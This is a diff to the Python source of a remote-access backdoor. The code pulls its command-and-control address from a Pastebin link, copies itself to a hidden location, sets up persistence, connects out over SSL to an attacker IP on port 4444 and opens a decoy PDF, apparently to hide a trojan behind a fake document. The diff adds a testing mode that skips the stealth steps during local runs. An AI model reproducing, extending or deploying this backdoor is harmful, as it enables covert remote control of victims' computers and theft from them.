@@ -17,6 +17,9 @@ except ImportError:
     ImageGrab = None
 import pyautogui
 
+# Flag to determine if we're in testing mode
+TESTING_MODE = not getattr(sys, 'frozen', False) and __name__ == "__main__"
+
 def fetch_c2_ip():
     try:
         url = "https://pastebin.com/raw/DjTikqsH" # This is mine change it to ur Pastebin link
@@ -27,8 +30,13 @@ def fetch_c2_ip():
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.copy_to_secret_location()
-        self.become_persistent()
+        if not TESTING_MODE:
+            # Skip these operations when in testing mode
+            self.copy_to_secret_location()
+            self.become_persistent()
+        else:
+            print("[*] Running in testing mode - skipping file copying and persistence")
+            
         # Create a TCP socket connection with IPv4
         raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Wrap the socket with SSL (no certificate verification for client)
@@ -312,12 +320,16 @@ def main():
     if ATTACKER_IP == "Server down for pastebin":
         sys.exit("[-] Could not fetch C2 IP. Exiting.")
 
-    if hasattr(sys, "_MEIPASS"):
+    # Skip PDF opening when in testing mode
+    if hasattr(sys, "_MEIPASS") and not TESTING_MODE:
         file_name = os.path.join(sys._MEIPASS, "sample.pdf")
         subprocess.Popen(file_name, shell=True)  # Open the pdf file
 
     while True:
         try:
+            if TESTING_MODE:
+                print(f"[*] Testing mode: Connecting to {ATTACKER_IP}:4444")
+                
             my_backdoor = Backdoor(ATTACKER_IP, 4444)
             my_backdoor.run()
         except Exception as e:
